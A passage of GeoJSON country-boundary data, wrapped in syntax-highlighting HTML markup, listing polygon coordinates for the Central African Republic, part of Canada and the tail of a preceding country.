class="hljs-selector-attr">[20.881134,-21.814327]</span>,<span class="hljs-selector-attr">[20.910641,-18.252219]</span>,<span class="hljs-selector-attr">[21.65504,-18.219146]</span>,<span class="hljs-selector-attr">[23.196858,-17.869038]</span>,<span class="hljs-selector-attr">[23.579006,-18.281261]</span>,<span class="hljs-selector-attr">[24.217365,-17.889347]</span>,<span class="hljs-selector-attr">[24.520705,-17.887125]</span>,<span class="hljs-selector-attr">[25.084443,-17.661816]</span>,<span class="hljs-selector-attr">[25.264226,-17.73654]</span>,<span class="hljs-selector-attr">[25.649163,-18.536026]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">CAF</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Central</span> <span class="hljs-selector-tag">African</span> <span class="hljs-selector-tag">Republic</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[15.27946,7.421925]</span>,<span class="hljs-selector-attr">[16.106232,7.497088]</span>,<span class="hljs-selector-attr">[16.290562,7.754307]</span>,<span class="hljs-selector-attr">[16.456185,7.734774]</span>,<span class="hljs-selector-attr">[16.705988,7.508328]</span>,<span class="hljs-selector-attr">[17.96493,7.890914]</span>,<span class="hljs-selector-attr">[18.389555,8.281304]</span>,<span class="hljs-selector-attr">[18.911022,8.630895]</span>,<span class="hljs-selector-attr">[18.81201,8.982915]</span>,<span class="hljs-selector-attr">[19.094008,9.074847]</span>,<span class="hljs-selector-attr">[20.059685,9.012706]</span>,<span class="hljs-selector-attr">[21.000868,9.475985]</span>,<span class="hljs-selector-attr">[21.723822,10.567056]</span>,<span class="hljs-selector-attr">[22.231129,10.971889]</span>,<span class="hljs-selector-attr">[22.864165,11.142395]</span>,<span class="hljs-selector-attr">[22.977544,10.714463]</span>,<span class="hljs-selector-attr">[23.554304,10.089255]</span>,<span class="hljs-selector-attr">[23.55725,9.681218]</span>,<span class="hljs-selector-attr">[23.394779,9.265068]</span>,<span class="hljs-selector-attr">[23.459013,8.954286]</span>,<span class="hljs-selector-attr">[23.805813,8.666319]</span>,<span class="hljs-selector-attr">[24.567369,8.229188]</span>,<span class="hljs-selector-attr">[25.114932,7.825104]</span>,<span class="hljs-selector-attr">[25.124131,7.500085]</span>,<span class="hljs-selector-attr">[25.796648,6.979316]</span>,<span class="hljs-selector-attr">[26.213418,6.546603]</span>,<span class="hljs-selector-attr">[26.465909,5.946717]</span>,<span class="hljs-selector-attr">[27.213409,5.550953]</span>,<span class="hljs-selector-attr">[27.374226,5.233944]</span>,<span class="hljs-selector-attr">[27.044065,5.127853]</span>,<span class="hljs-selector-attr">[26.402761,5.150875]</span>,<span class="hljs-selector-attr">[25.650455,5.256088]</span>,<span class="hljs-selector-attr">[25.278798,5.170408]</span>,<span class="hljs-selector-attr">[25.128833,4.927245]</span>,<span class="hljs-selector-attr">[24.805029,4.897247]</span>,<span class="hljs-selector-attr">[24.410531,5.108784]</span>,<span class="hljs-selector-attr">[23.297214,4.609693]</span>,<span class="hljs-selector-attr">[22.84148,4.710126]</span>,<span class="hljs-selector-attr">[22.704124,4.633051]</span>,<span class="hljs-selector-attr">[22.405124,4.02916]</span>,<span class="hljs-selector-attr">[21.659123,4.224342]</span>,<span class="hljs-selector-attr">[20.927591,4.322786]</span>,<span class="hljs-selector-attr">[20.290679,4.691678]</span>,<span class="hljs-selector-attr">[19.467784,5.031528]</span>,<span class="hljs-selector-attr">[18.932312,4.709506]</span>,<span class="hljs-selector-attr">[18.542982,4.201785]</span>,<span class="hljs-selector-attr">[18.453065,3.504386]</span>,<span class="hljs-selector-attr">[17.8099,3.560196]</span>,<span class="hljs-selector-attr">[17.133042,3.728197]</span>,<span class="hljs-selector-attr">[16.537058,3.198255]</span>,<span class="hljs-selector-attr">[16.012852,2.26764]</span>,<span class="hljs-selector-attr">[15.907381,2.557389]</span>,<span class="hljs-selector-attr">[15.862732,3.013537]</span>,<span class="hljs-selector-attr">[15.405396,3.335301]</span>,<span class="hljs-selector-attr">[15.03622,3.851367]</span>,<span class="hljs-selector-attr">[14.950953,4.210389]</span>,<span class="hljs-selector-attr">[14.478372,4.732605]</span>,<span class="hljs-selector-attr">[14.558936,5.030598]</span>,<span class="hljs-selector-attr">[14.459407,5.451761]</span>,<span class="hljs-selector-attr">[14.53656,6.226959]</span>,<span class="hljs-selector-attr">[14.776545,6.408498]</span>,<span class="hljs-selector-attr">[15.27946,7.421925]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">CAN</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Canada</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">MultiPolygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[[-63.6645,46.55001]</span>,<span class="hljs-selector-attr">[-62.9393,46.41587]</span>,<span class="hljs-selector-attr">[-62.01208,46.44314]</span>,<span class="hljs-selector-attr">[-62.50391,46.03339]</span>,<span class="hljs-selector-attr">[-62.87433,45.96818]</span>,<span class="hljs-selector-attr">[-64.1428,46.39265]</span>,<span class="hljs-selector-attr">[-64.39261,46.72747]</span>,<span class="hljs-selector-attr">[-64.01486,47.03601]</span>,<span class="hljs-selector-attr">[-63.6645,46.55001]</span>]],<span class="hljs-selector-attr">[[[-61.806305,49.10506]</span>,<span class="hljs-selector-attr">[-62.29318,49.08717]</span>,<span class="hljs-selector-attr">[-63.58926,49.40069]</span>,<span class="hljs-selector-attr">[-64.51912,49.87304]</span>,<span class="hljs-selector-attr">[-64.17322,49.95718]</span>,<span class="hljs-selector-attr">[-62.85829,49.70641]</span>,<span class="hljs-selector-attr">[-61.835585,49.28855]</span>,<span class="hljs-selector-attr">[-61.806305,49.10506]</span>]],<span class="hljs-selector-attr">[[[-123.510002,48.510011]</span>,<span class="hljs-selector-attr">[-124.012891,48.370846]</span>,<span class="hljs-selector-attr">[-125.655013,48.825005]</span>,<span class="hljs-selector-attr">[-125.954994,49.179996]</span>,<span class="hljs-selector-attr">[-126.850004,49.53]</span>,<span class="hljs-selector-attr">[-127.029993,49.814996]</span>,<span class="hljs-selector-attr">[-128.059336,49.994959]</span>,<span class="hljs-selector-attr">[-128.444584,50.539138]</span>,<span class="hljs-selector-attr">[-128.358414,50.770648]</span>,<span class="hljs-selector-attr">[-127.308581,50.552574]</span>,<span class="hljs-selector-attr">[-126.695001,50.400903]</span>,<span class="hljs-selector-attr">[-125.755007,50.295018]</span>,<span class="hljs-selector-attr">[-125.415002,49.950001]</span>,<span class="hljs-selector-attr">[-124.920768,49.475275]</span>,<span class="hljs-selector-attr">[-123.922509,49.062484]</span>,<span class="hljs-selector-attr">[-123.510002,48.510011]</span>]],<span class="hljs-selector-attr">[[[-56.134036,50.68701]</span>,<span class="hljs-selector-attr">[-56.795882,49.812309]</span>,<span class="hljs-selector-attr">[-56.143105,50.150117]</span>,<span class="hljs-selector-attr">[-55.471492,49.935815]</span>,<span class="hljs-selector-attr">[-55.822401,49.587129]</span>,<span class="hljs-selector-attr">[-54.935143,49.313011]</span>,<span class="hljs-selector-attr">[-54.473775,49.556691]</span>,<span class="hljs-selector-attr">[-53.476549,49.249139]</span>,<span class="hljs-selector-attr">[-53.786014,48.516781]</span>,<span class="hljs-selector-attr">[-53.086134,48.687804]</span>,<span class="hljs-selector-attr">[-52.958648,48.157164]</span>,<span class="hljs-selector-attr">[-52.648099,47.535548]</span>,<span class="hljs-selector-attr">[-53.069158,46.655499]</span>,<span class="hljs-selector-attr">[-53.521456,46.618292]</span>,<span class="hljs-selector-attr">[-54.178936,46.807066]</span>,<span class="hljs-selector-attr">[-53.961869,47.625207]</span>,<span class="hljs-selector-attr">[-54.240482,47.752279]</span>,<span class="hljs-selector-attr">[-55.400773,46.884994]</span>,<span class="hljs-selector-attr">[-55.997481,46.91972]</span>,<span class="hljs-selector-attr">[-55.291219,47.389562]</span>,<span class="hljs-selector-attr">[-56.250799,47.632545]</span>,<span class="hljs-selector-attr">[-57.325229,47.572807]</span>,<span class="hljs-selector-attr">[-59.266015,47.603348]</span>,<span class="hljs-selector-attr">[-59.419494,47.899454]</span>,<span class="hljs-selector-attr">[-58.796586,48.251525]</span>,<span class="hljs-selector-attr">[-59.231625,48.523188]</span>,<span class="hljs-selector-attr">[-58.391805,49.125581]</span>,<span class="hljs-selector-attr">[-57.35869,50.718274]</span>,<span class="hljs-selector-attr">[-56.73865,51.287438]</span>,<span class="hljs-selector-attr">[-55.870977,51.632094]</span>,<span class="hljs-selector-attr">[-55.406974,51.588273]</span>,<span class="hljs-selector-attr">[-55.600218,51.317075]</span>,<span class="hljs-selector-attr">[-56.134036,50.68701]</span>]],<span class="hljs-selector-attr">[[[-132.710008,54.040009]</span>,<span class="hljs-selector-attr">[-132.710009,54.040009]</span>,<span class="hljs-selector-attr">[-132.710008,54.040009]</span>,<span class="hljs-selector-attr">[-132.710008,54.040009]</span>,<span class="hljs-selector-attr">[-131.74999,54.120004]</span>,<span class="hljs-selector-attr">[-132.04948,52.984621]</span>,<span class="hljs-selector-attr">[-131.179043,52.180433]</span>,<span class="hljs-selector-attr">[-131.57783,52.182371]</span>,<span class="hljs-selector-attr">[-132.180428,52.639707]</span>,<span class="hljs-selector-attr">[-132.549992,53.100015]</span>,<span class="hljs-selector-attr">[-133.054611,53.411469]</span>,<span class="hljs-selector-attr">[-133.239664,53.85108]</span>,<span class="hljs-selector-attr">[-133.180004,54.169975]</span>,<span class="hljs-selector-attr">[-132.710008,54.040009]</span>]],<span class="hljs-selector-attr">[[[-79.26582,62.158675]</span>,<span class="hljs-selector-attr">[-79.65752,61.63308]</span>,<span class="hljs-selector-attr">[-80.09956,61.7181]</span>,<span class="hljs-selector-attr">[-80.36215,62.01649]</span>,<span class="hljs-selector-attr">[-80.315395,62.085565]</span>,<span class="hljs-selector-attr">[-79.92939,62.3856]</span>,<span class="hljs-selector-attr">[-79.52002,62.36371]</span>,<span class="hljs-selector-attr">[-79.26582,62.158675]</span>]],<span class="hljs-selector-attr">[[[-81.89825,62.7108]</span>,<span class="hljs-selector-attr">[-83.06857,62.15922]</span>,<span class="hljs-selector-attr">[-83.77462,62.18231]</span>,<span class="hljs-selector-attr">[-83.99367,62.4528]</span>,<span class="hljs-selector-attr">[-83.25048,62.91409]</span>,<span class="hljs-selector-attr">[-81.87699,62.90458]</span>,<span class="hljs-selector-attr">[-81.89825,62.7108]</span>]],<span class="hljs-selector-attr">[[[-85.161308,65.657285]</span>,<span class="hljs-selector-attr">[-84.975764,65.217518]</span>,<span class="hljs-selector-attr">[-84.464012,65.371772]</span>,<span class="hljs-selector-attr">[-83.882626,65.109618]</span>,<span class="hljs-selector-attr">[-82.787577,64.766693]</span>,<span class="hljs-selector-attr">[-81.642014,64.455136]</span>,<span class="hljs-selector-attr">[-81.55344,63.979609]</span>,<span class="hljs-selector-attr">[-80.817361,64.057486]</span>,<span class="hljs-selector-attr">[-80.103451,63.725981]</span>,<span class="hljs-selector-attr">[-80.99102,63.411246]</span>,<span class="hljs-selector-attr">[-82.547178,63.651722]</span>,<span class="hljs-selector-attr">[-83.108798,64.101876]</span>,<span class="hljs-selector-attr">[-84.100417,63.569712]</span>,<span class="hljs-selector-attr">[-85.523405,63.052379]</span>,<span class="hljs-selector-attr">[-85.866769,63.637253]</span>,<span class="hljs-selector-attr">[-87.221983,63.541238]</span>,<span class="hljs-selector-attr">[-86.35276,64.035833]</span>,<span class="hljs-selector-attr">[-86.224886,64.822917]</span>,<span class="hljs-selector-attr">[-85.883848,65.738778]</span>,<span class="hljs-selector-attr">[-85.161308,65.657285]</span>]],<span class="hljs-selector-attr">[[[-75.86588,67.14886]</span>,<span class="hljs-selector-attr">[-76.98687,67.09873]</span>,<span class="hljs-selector-attr">[-77.2364,67.58809]</span>,<span class="hljs-selector-attr">[-76.81166,68.14856]</span>,<span class="hljs-selector-attr">[-75.89521,68.28721]</span>,<span class="hljs-selector-attr">[-75.1145,68.01036]</span>,<span class="hljs-selector-attr">[-75.10333,67.58202]</span>,<span class="hljs-selector-attr">[-75.21597,67.44425]</span>,<span class="hljs-selector-attr">[-75.86588,67.14886]</span>]],<span class="hljs-selector-attr">[[[-95.647681,69.10769]</span>,<span class="hljs-selector-attr">[-96.269521,68.75704]</span>,<span class="hljs-selector-attr">[-97.617401,69.06003]</span>,<span class="hljs-selector-attr">[-98.431801,68.9507]</span>,<span class="hljs-selector-attr">[-99.797401,69.40003]</span>,<span class="hljs-selector-attr">[-98.917401,69.71003]</span>,<span class="hljs-selector-attr">[-98.218261,70.14354]</span>,<span class="hljs-selector-attr">[-97.157401,69.86003]</span>,<span class="hljs-selector-attr">[-96.557401,69.68003]</span>,<span class="hljs-selector-attr">[-96.257401,69.49003]</span>,<span class="hljs-selector-attr">[-95.647681,69.10769]</span>]],<span class="hljs-selector-attr">[[[-90.5471,69.49766]</span>,<span class="hljs-selector-attr">[-90.55151,68.47499]</span>,<span class="hljs-selector-attr">[-89.21515,69.25873]</span>,<span class="hljs-selector-attr">[-88.01966,68.61508]</span>,<span class="hljs-selector-attr">[-88.31749,67.87338]</span>,<span class="hljs-selector-attr">[-87.35017,67.19872]</span>,<span class="hljs-selector-attr">[-86.30607,67.92146]</span>,<span class="hljs-selector-attr">[-85.57664,68.78456]</span>,<span class="hljs-selector-attr">[-85.52197,69.88211]</span>,<span class="hljs-selector-attr">[-84.10081,69.80539]</span>,<span class="hljs-selector-attr">[-82.62258,69.65826]</span>,<span class="hljs-selector-attr">[-81.28043,69.16202]</span>,<span class="hljs-selector-attr">[-81.2202,68.66567]</span>,<span class="hljs-selector-attr">[-81.96436,68.13253]</span>,<span class="hljs-selector-attr">[-81.25928,67.59716]</span>,<span class="hljs-selector-attr">[-81.38653,67.11078]</span>,<span class="hljs-selector-attr">[-83.34456,66.41154]</span>,<span class="hljs-selector-attr">[-84.73542,66.2573]</span>,<span class="hljs-selector-attr">[-85.76943,66.55833]</span>,<span class="hljs-selector-attr">[-86.0676,66.05625]</span>,<span class="hljs-selector-attr">[-87.03143,65.21297]</span>,<span class="hljs-selector-attr">[-87.32324,64.77563]</span>,<span class="hljs-selector-attr">[-88.48296,64.09897]</span>,<span class="hljs-selector-attr">[-89.91444,64.03273]</span>,<span class="hljs-selector-attr">[-90.70398,63.61017]</span>,<span class="hljs-selector-attr">[-90.77004,62.96021]</span>,<span class="hljs-selector-attr">[-91.93342,62.83508]</span>,<span class="hljs-selector-attr">[-93.15698,62.02469]</span>,<span class="hljs-selector-attr">[-94.24153,60.89865]</span>,<span class="hljs-selector-attr">[-94.62931,60.11021]</span>,<span class="hljs-selector-attr">[-94.6846,58.94882]</span>,<span class="hljs-selector-attr">[-93.21502,58.78212]</span>,<span class="hljs-selector-attr">[-92.76462,57.84571]</span>,<span class="hljs-selector-attr">[-92.29703,57.08709]</span>,<span class="hljs-selector-attr">[-90.89769,57.28468]</span>,<span class="hljs-selector-attr">[-89.03953,56.85172]</span>,<span class="hljs-selector-attr">[-88.03978,56.47162]</span>,<span class="hljs-selector-attr">[-87.32421,55.99914]</span>,<span class="hljs-selector-attr">[-86.07121,55.72383]</span>,<span class="hljs-selector-attr">[-85.01181,55.3026]</span>,<span class="hljs-selector-attr">[-83.36055,55.24489]</span>,<span class="hljs-selector-attr">[-82.27285,55.14832]</span>,<span class="hljs-selector-attr">[-82.4362,54.28227]</span>,<span class="hljs-selector-attr">[-82.12502,53.27703]</span>,<span class="hljs-selector-attr">[-81.40075,52.15788]</span>,<span class="hljs-selector-attr">[-79.91289,51.20842]</span>,<span class="hljs-selector-attr">[-79.14301,51.53393]</span>,<span class="hljs-selector-attr">[-78.60191,52.56208]</span>,<span class="hljs-selector-attr">[-79.12421,54.14145]</span>,<span class="hljs-selector-attr">[-79.82958,54.66772]</span>,<span class="hljs-selector-attr">[-78.22874,55.13645]</span>,<span class="hljs-selector-attr">[-77.0956,55.83741]</span>,<span class="hljs-selector-attr">[-76.54137,56.53423]</span>,<span class="hljs-selector-attr">[-76.62319,57.20263]</span>,<span class="hljs-selector-attr">[-77.30226,58.05209]</span>,<span class="hljs-selector-attr">[-78.51688,58.80458]</span>,<span class="hljs-selector-attr">[-77.33676,59.85261]</span>,<span class="hljs-selector-attr">[-77.77272,60.75788]</span>,<span class="hljs-selector-attr">[-78.10687,62.31964]</span>,<span class="hljs-selector-attr">[-77.41067,62.55053]</span>,<span class="hljs-selector-attr">[-75.69621,62.2784]</span>,<span class="hljs-selector-attr">[-74.6682,62.18111]</span>,<span class="hljs-selector-attr">[-73.83988,62.4438]</span>,<span class="hljs-selector-attr">[-72.90853,62.10507]</span>,<span class="hljs-selector-attr">[-71.67708,61.52535]</span>,<span class="hljs-selector-attr">[-71.37369,61.13717]</span>,<span class="hljs-selector-attr">[-69.59042,61.06141]</span>,<span class="hljs-selector-attr">[-69.62033,60.22125]</span>,<span class="hljs-selector-attr">[-69.2879,58.95736]</span>,<span class="hljs-selector-attr">[-68.37455,58.80106]</span>,<span class="hljs-selector-attr">[-67.64976,58.21206]</span>,<span class="hljs-selector-attr">[-66.20178,58.76731]</span>,<span class="hljs-selector-attr">[-65.24517,59.87071]</span>,<span class="hljs-selector-attr">[-64.58352,60.33558]</span>,<span class="hljs-selector-attr">[-63.80475,59.4426]</span>,<span class="hljs-selector-attr">[-62.50236,58.16708]</span>,<span class="hljs-selector-attr">[-61.39655,56.96745]</span>,<span class="hljs-selector-attr">[-61.79866,56.33945]</span>,<span class="hljs-selector-attr">[-60.46853,55.77548]</span>,<span class="hljs-selector-attr">[-59.56962,55.20407]</span>,<span class="hljs-selector-attr">[-57.97508,54.94549]</span>,<span class="hljs-selector-attr">[-57.3332,54.6265]</span>,<span class="hljs-selector-attr">[-56.93689,53.78032]</span>,<span class="hljs-selector-attr">[-56.15811,53.64749]</span>,<span class="hljs-selector-attr">[-55.75632,53.27036]</span>,<span class="hljs-selector-attr">[-55.68338,52.14664]</span>,<span class="hljs-selector-attr">[-56.40916,51.7707]</span>,<span class="hljs-selector-attr">[-57.12691,51.41972]</span>,<span class="hljs-selector-attr">[-58.77482,51.0643]</span>,<span class="hljs-selector-attr">[-60.03309,50.24277]</span>,<span class="hljs-selector-attr">[-61.72366,50.08046]</span>,<span class="hljs-selector-attr">[-63.86251,50.29099]</span>,<span class="hljs-selector-attr">[-65.36331,50.2982]</span>,<span class="hljs-selector-attr">[-66.39905,50.22897]</span>,<span class="hljs-selector-attr">[-67.23631,49.51156]</span>,<span class="hljs-selector-attr">[-68.51114,49.06836]</span>,<span class="hljs-selector-attr">[-69.95362,47.74488]</span>,<span class="hljs-selector-attr">[-71.10458,46.82171]</span>,<span class="hljs-selector-attr">[-70.25522,46.98606]</span>,<span class="hljs-selector-attr">[-68.65,48.3]</span>,<span class="hljs-selector-attr">[-66.55243,49.1331]</span>,<span class="hljs-selector-attr">[-65.05626,49.23278]</span>,<span class="hljs-selector-attr">[-64.17099,48.74248]</span>,<span class="hljs-selector-attr">[-65.11545,48.07085]</span>,<span class="hljs-selector-attr">[-64.79854,46.99297]</span>,<span class="hljs-selector-attr">[-64.47219,46.23849]</span>,<span class="hljs-selector-attr">[-63.17329,45.73902]</span>,<span class="hljs-selector-attr">[-61.52072,45.88377]</span>,<span class="hljs-selector-attr">[-60.51815,47.00793]</span>,<span class="hljs-selector-attr">[-60.4486,46.28264]</span>,<span class="hljs-selector-attr">[-59.80287,45.9204]</span>,<span class="hljs-selector-attr">[-61.03988,45.26525]</span>,<span class="hljs-selector-attr">[-63.25471,44.67014]</span>,<span class="hljs-selector-attr">[-64.24656,44.26553]</span>,<span class="hljs-selector-attr">[-65.36406,43.54523]</span>,<span class="hljs-selector-attr">[-66.1234,43.61867]</span>,<span class="hljs-selector-attr">[-66.16173,44.46512]</span>,<span class="hljs-selector-attr">[-64.42549,45.29204]</span>,<span class="hljs-selector-attr">[-66.02605,45.25931]</span>,<span class="hljs-selector-attr">[-67.13741,45.13753]</span>,<span class="hljs-selector-attr">[-67.79134,45.70281]</span>,<span class="hljs-selector-attr">[-67.79046,47.06636]</span>,<span class="hljs-selector-attr">[-68.23444,47.35486]</span>,<span class="hljs-selector-attr">[-68.905,47.185]</span>,<span class="hljs-selector-attr">[-69.237216,47.447781]</span>,<span class="hljs-selector-attr">[-69.99997,46.69307]</span>,<span class="hljs-selector-attr">[-70.305,45.915]</span>,<span class="hljs-selector-attr">[-70.66,45.46]</span>,<span class="hljs-selector-attr">[-71.08482,45.30524]</span>,<span class="hljs-selector-attr">[-71.405,45.255]</span>,<span class="hljs-selector-attr">[-71.50506,45.0082]</span>,<span class="hljs-selector-attr">[-73.34783,45.00738]</span>,<span class="hljs-selector-attr">[-74.867,45.00048]</span>,<span class="hljs-selector-attr">[-75.31821,44.81645]</span>,<span class="hljs-selector-attr">[-76.375,44.09631]</span>,<span class="hljs-selector-attr">[-76.5,44.018459]</span>,<span class="hljs-selector-attr">[-76.820034,43.628784]</span>,<span class="hljs-selector-attr">[-77.737885,43.629056]</span>,<span class="hljs-selector-attr">[-78.72028,43.625089]</span>,<span class="hljs-selector-attr">[-79.171674,43.466339]</span>,<span class="hljs-selector-attr">[-79.01,43.27]</span>,<span class="hljs-selector-attr">[-78.92,42.965]</span>,<span class="hljs-selector-attr">[-78.939362,42.863611]</span>,<span class="hljs-selector-attr">[-80.247448,42.3662]</span>,<span class="hljs-selector-attr">[-81.277747,42.209026]</span>,<span class="hljs-selector-attr">[-82.439278,41.675105]</span>,<span class="hljs-selector-attr">[-82.690089,41.675105]</span>,<span class="hljs-selector-attr">[-83.02981,41.832796]</span>,<span class="hljs-selector-attr">[-83.142,41.975681]</span>,<span class="hljs-selector-attr">[-83.12,42.08]</span>,<span class="hljs-selector-attr">[-82.9,42.43]</span>,<span class="hljs-selector-attr">[-82.43,42.98]</span>,<span class="hljs-selector-attr">[-82.137642,43.571088]</span>,<span class="hljs-selector-attr">[-82.337763,44.44]</span>,<span class="hljs-selector-attr">[-82.550925,45.347517]</span>,<span class="hljs-selector-attr">[-83.592851,45.816894]</span>,<span class="hljs-selector-attr">[-83.469551,45.994686]</span>,<span class="hljs-selector-attr">[-83.616131,46.116927]</span>,<span class="hljs-selector-attr">[-83.890765,46.116927]</span>,<span class="hljs-selector-attr">[-84.091851,46.275419]</span>,<span class="hljs-selector-attr">[-84.14212,46.512226]</span>,<span class="hljs-selector-attr">[-84.3367,46.40877]</span>,<span class="hljs-selector-attr">[-84.6049,46.4396]</span>,<span class="hljs-selector-attr">[-84.543749,46.538684]</span>,<span class="hljs-selector-attr">[-84.779238,46.637102]</span>,<span class="hljs-selector-attr">[-84.87608,46.900083]</span>,<span class="hljs-selector-attr">[-85.652363,47.220219]</span>,<span class="hljs-selector-attr">[-86.461991,47.553338]</span>,<span class="hljs-selector-attr">[-87.439793,47.94]</span>,<span class="hljs-selector-attr">[-88.378114,48.302918]</span>,<span class="hljs-selector-attr">[-89.272917,48.019808]</span>,<span class="hljs-selector-attr">[-89.6,48.01]</span>,<span class="hljs-selector-attr">[-90.83,48.27]</span>,<span class="hljs-selector-attr">[-91.64,48.14]</span>,<span class="hljs-selector-attr">[-92.61,48.45]</span>,<span class="hljs-selector-attr">[-93.63087,48.60926]</span>,<span class="hljs-selector-attr">[-94.32914,48.67074]</span>,<span class="hljs-selector-attr">[-94.64,48.84]</span>,<span class="hljs-selector-attr">[-94.81758,49.38905]</span>,<span class="hljs-selector-attr">[-95.15609,49.38425]</span>,<span class="hljs-selector-attr">[-95.15907,49]</span>,<span class="hljs-selector-attr">[-97.22872,49.0007]</span>,<span class="hljs-selector-attr">[-100.65,49]</span>,<span class="hljs-selector-attr">[-104.04826,48.99986]</span>,<span class="hljs-selector-attr">[-107.05,49]</span>,<span class="hljs-selector-attr">[-110.05,49]</span>,<span class="hljs-selector-attr">[-113,49]</span>,<span class="hljs-selector-attr">[-116.04818,49]</span>,<span class="hljs-selector-attr">[-117.03121,49]</span>,<span class="hljs-selector-attr">[-120,49]</span>,<span class="hljs-selector-attr">[-122.84,49]</span>,<span class="hljs-selector-attr">[-122.97421,49.002538]</span>,<span class="hljs-selector-attr">[-124.91024,49.98456]</span>,<span class="hljs-selector-attr">[-125.62461,50.41656]</span>,<span class="hljs-selector-attr">[-127.43561,50.83061]</span>,<span class="hljs-selector-attr">[-127.99276,51.71583]</span>,<span class="hljs-selector-attr">[-127.85032,52.32961]</span>,<span class="hljs-selector-attr">[-129.12979,52.75538]</span>,<span class="hljs-selector-attr">[-129.30523,53.56159]</span>,<span class="hljs-selector-attr">[-130.51497,54.28757]</span>,<span class="hljs-selector-attr">[-130.53611,54.80278]</span>,<span class="hljs-selector-attr">[-129.98,55.285]</span>,<span class="hljs-selector-attr">[-130.00778,55.91583]</span>,<span class="hljs-selector-attr">[-131.70781,56.55212]</span>,<span class="hljs-selector-attr">[-132.73042,57.69289]</span>,<span class="hljs-selector-attr">[-133.35556,58.41028]</span>,<span class="hljs-selector-attr">[-134.27111,58.86111]</span>,<span class="hljs-selector-attr">[-134.945,59.27056]</span>,<span class="hljs-selector-attr">[-135.47583,59.78778]</span>,<span class="hljs-selector-attr">[-136.47972,59.46389]</span>,<span class="hljs-selector-attr">[-137.4525,58.905]</span>,<span class="hljs-selector-attr">[-138.34089,59.56211]</span>,<span class="hljs-selector-attr">[-139.039,60]</span>,<span class="hljs-selector-attr">[-140.013,60.27682]</span>,<span class="hljs-selector-attr">[-140.99778,60.30639]</span>,<span class="hljs-selector-attr">[-140.9925,66.00003]</span>,<span class="hljs-selector-attr">[-140.986,69.712]</span>,<span class="hljs-selector-attr">[-139.12052,69.47102]</span>,<span class="hljs-selector-attr">[-137.54636,68.99002]</span>,<span class="hljs-selector-attr">[-136.50358,68.89804]</span>,<span class="hljs-selector-attr">[-135.62576,69.31512]</span>,<span class="hljs-selector-attr">[-134.41464,69.62743]</span>,<span class="hljs-selector-attr">[-132.92925,69.50534]</span>,<span class="hljs-selector-attr">[-131.43136,69.94451]</span>,<span class="hljs-selector-attr">[-129.79471,70.19369]</span>,<span class="hljs-selector-attr">[-129.10773,69.77927]</span>,<span class="hljs-selector-attr">[-128.36156,70.01286]</span>,<span class="hljs-selector-attr">[-128.13817,70.48384]</span>,<span class="hljs-selector-attr">[-127.44712,70.37721]</span>,<span class="hljs-selector-attr">[-125.75632,69.48058]</span>,<span class="hljs-selector-attr">[-124.42483,70.1584]</span>,<span class="hljs-selector-attr">[-124.28968,69.39969]</span>,<span class="hljs-selector-attr">[-123.06108,69.56372]</span>,<span class="hljs-selector-attr">[-122.6835,69.85553]</span>,<span class="hljs-selector-attr">[-121.47226,69.79778]</span>,<span class="hljs-selector-attr">[-119.94288,69.37786]</span>,<span class="hljs-selector-attr">[-117.60268,69.01128]</span>,<span class="hljs-selector-attr">[-116.22643,68.84151]</span>,<span class="hljs-selector-attr">[-115.2469,68.90591]</span>,<span class="hljs-selector-attr">[-113.89794,68.3989]</span>,<span class="hljs-selector-attr">[-115.30489,67.90261]</span>,<span class="hljs-selector-attr">[-113.49727,67.68815]</span>,<span class="hljs-selector-attr">[-110.798,67.80612]</span>,<span class="hljs-selector-attr">[-109.94619,67.98104]</span>,<span class="hljs-selector-attr">[-108.8802,67.38144]</span>,<span class="hljs-selector-attr">[-107.79239,67.88736]</span>,<span class="hljs-selector-attr">[-108.81299,68.31164]</span>,<span class="hljs-selector-attr">[-108.16721,68.65392]</span>,<span class="hljs-selector-attr">[-106.95,68.7]</span>,<span class="hljs-selector-attr">[-106.15,68.8]</span>,<span class="hljs-selector-attr">[-105.34282,68.56122]</span>,<span class="hljs-selector-attr">[-104.33791,68.018]</span>,<span class="hljs-selector-attr">[-103.22115,68.09775]</span>,<span class="hljs-selector-attr">[-101.45433,67.64689]</span>,<span class="hljs-selector-attr">[-99.90195,67.80566]</span>,<span class="hljs-selector-attr">[-98.4432,67.78165]</span>,<span class="hljs-selector-attr">[-98.5586,68.40394]</span>,<span class="hljs-selector-attr">[-97.66948,68.57864]</span>,<span class="hljs-selector-attr">[-96.11991,68.23939]</span>,<span class="hljs-selector-attr">[-96.12588,67.29338]</span>,<span class="hljs-selector-attr">[-95.48943,68.0907]</span>,<span class="hljs-selector-attr">[-94.685,68.06383]</span>,<span class="hljs-selector-attr">[-94.23282,69.06903]</span>,<span class="hljs-selector-attr">[-95.30408,69.68571]</span>,<span class="hljs-selector-attr">[-96.47131,70.08976]</span>,<span class="hljs-selector-attr">[-96.39115,71.19482]</span>,<span class="hljs-selector-attr">[-95.2088,71.92053]</span>,<span class="hljs-selector-attr">[-93.88997,71.76015]</span>,<span class="hljs-selector-attr">[-92.87818,71.31869]</span>,<span class="hljs-selector-attr">[-91.51964,70.19129]</span>,<span class="hljs-selector-attr">[-92.40692,69.69997]</span>,<span class="hljs-selector-attr">[-90.5471,69.49766]</span>]],<span class="hljs-selector-attr">[[[-114.16717,73.12145]</span>,<span class="hljs-selector-attr">[-114.66634,72.65277]</span>,<span class="hljs-selector-attr">[-112.44102,72.9554]</span>,<span class="hljs-selector-attr">[-111.05039,72.4504]</span>,<span class="hljs-selector-attr">[-109.92035,72.96113]</span>,<span class="hljs-selector-attr">[-109.00654,72.63335]</span>,<span class="hljs-selector-attr">[-108.18835,71.65089]</span>,<span 